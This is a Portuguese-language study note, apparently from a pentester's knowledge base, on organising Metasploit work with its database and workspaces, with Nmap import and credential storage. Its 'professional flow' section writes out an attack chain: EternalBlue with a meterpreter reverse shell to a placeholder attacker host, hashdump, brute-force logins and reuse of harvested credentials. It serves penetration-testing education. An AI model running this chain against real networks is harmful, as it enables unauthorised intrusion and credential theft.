# 🗄️ Metasploit — Banco de Dados e Workspaces

> Quem usa o banco de dados corretamente para de "rodar exploit" e começa a **gerenciar campanha de teste**.
> Sem DB ativo, você está usando só metade da framework.

---

## 🧠 O Que o DB Armazena

O Metasploit usa **PostgreSQL** internamente para persistir:

| Tabela | Conteúdo |
|--------|---------|
| `hosts` | IPs e hostnames descobertos |
| `services` | Portas, protocolos e versões |
| `vulns` | Vulnerabilidades identificadas |
| `creds` | Credenciais coletadas |
| `sessions` | Sessões abertas e histórico |
| `notes` | Anotações por host |

---

## 1️⃣ Verificar e Inicializar o Banco

```bash
# Dentro do msfconsole
db_status
```

**Saída esperada:**
```
[*] Connected to msf. Connection type: postgresql.
```

**Se não estiver conectado:**
```bash
# No terminal Linux (fora do msfconsole)
msfdb init

# Reinicie o console
msfconsole
```

---

## 2️⃣ Workspaces — Organização por Projeto

Workspaces funcionam como **pastas lógicas de cliente**. Cada engajamento isolado no seu próprio contexto.

```bash
# Ver workspaces existentes
workspace

# Criar novo workspace
workspace -a clienteX

# Trocar de workspace
workspace clienteX

# Deletar workspace
workspace -d clienteX

# Renomear
workspace -r nome_antigo nome_novo
```

> 💡 Boas práticas: um workspace por cliente, por lab, por subnet. Nunca misture dados de engajamentos diferentes.

---

## 3️⃣ Importar Scan do Nmap

**Passo 1 — Gerar XML fora do Metasploit:**
```bash
nmap -sS -sV -oX scan.xml TARGET
```

**Passo 2 — Importar no msfconsole:**
```bash
db_import scan.xml
```

**Passo 3 — Verificar o que entrou:**
```bash
hosts       # IPs descobertos
services    # serviços e versões
vulns       # vulnerabilidades (se -sC ou --script=vuln)
```

Você transformou um arquivo de texto em **dados estruturados e consultáveis**.

---

## 4️⃣ db_nmap — Nmap Direto do Metasploit

```bash
db_nmap -sS -sV TARGET
db_nmap -sS -sV -p- 192.168.1.0/24
```

Executa o Nmap e **salva automaticamente** no banco. Sem importação manual.

```bash
# Verificar resultado imediatamente
hosts
services
```

---

## 5️⃣ Consultando o Banco

```bash
# Todos os hosts
hosts

# Filtrar por porta
services -p 445
services -p 22
services -p 80,443

# Filtrar por protocolo
services -p 445 -u tcp

# Buscar serviço específico
services -s http
services -s ssh

# Vulnerabilidades registradas
vulns

# Credenciais coletadas
creds

# Notas
notes
```

---

## 6️⃣ Alimentar Módulos com Dados do Banco

### Modo manual (sem DB):
```
copiar IP → colar no set RHOSTS → rodar
```

### Modo com DB — flag `-R`:
```bash
# Filtra hosts com porta 445 aberta E joga no RHOSTS automaticamente
services -p 445 -R
```

Depois:
```bash
use exploit/windows/smb/ms17_010_eternalblue
# RHOSTS já está preenchido com todos os IPs do filtro
run
```

> `-R` é automação inteligente. Um filtro alimenta direto o módulo.

---

## 7️⃣ Credenciais no Banco

Qualquer scanner de login salva automaticamente:

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Ver o que foi coletado
creds
```

**Reutilizar credenciais coletadas:**
```bash
# Exportar para arquivo
creds -o creds.txt

# Usar direto em outro módulo
use auxiliary/scanner/smb/smb_login
set RHOSTS IP
creds -R   # injeta credenciais do banco no módulo
run
```

O Metasploit vira um **gerenciador de credenciais ofensivo**.

---

## 🔁 Fluxo Profissional Completo

```bash
# 1. Criar workspace isolado
workspace -a clienteX

# 2. Scan inicial com persistência automática
db_nmap -sS -sV -O 10.10.10.0/24

# 3. Verificar superfície
hosts
services
services -p 445
services -p 22
services -p 80

# 4. Módulos de detecção de vuln
use auxiliary/scanner/smb/smb_ms17_010
services -p 445 -R
run

# 5. Exploração orientada a dados
use exploit/windows/smb/ms17_010_eternalblue
services -p 445 -R
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST SEU_IP
run

# 6. Pós-exploração
sessions
sessions -i 1
hashdump
background

# 7. Reutilizar credenciais coletadas
creds
use auxiliary/scanner/smb/smb_login
creds -R
run
```

---

## 📊 Sem DB vs Com DB

| | Sem DB | Com DB |
|-|--------|--------|
| Fluxo | Scan → copiar IP → colar no exploit | Scan → banco → filtro → módulo automático |
| Credenciais | Anotadas manualmente | Armazenadas e reutilizáveis |
| Organização | Por sessão de terminal | Por workspace de projeto |
| Escala | 1 host por vez | Subnet inteira de uma vez |
| Modo de trabalho | Terminal artesanal | Orquestração de ataque |

---

## ⚠️ O Que Muita Gente Ignora

```
workspaces     → organização de projeto
db_nmap        → scan com persistência automática
services -R    → alimentar módulo automaticamente
creds          → reutilização de credenciais
vulns          → histórico de achados
```

Usar Metasploit sem banco é como ter um laboratório inteiro e usar só para acender fósforo.

---

## 📌 Relacionados

- [[Metasploit — Fundamentos e Arquitetura]]
- [[Nmap — Output Formats]]
- [[SMB — Enumeração e Comprometimento]]
- [[Cheatsheet — Portas Importantes]]

#ferramenta/metasploit #exploração #database
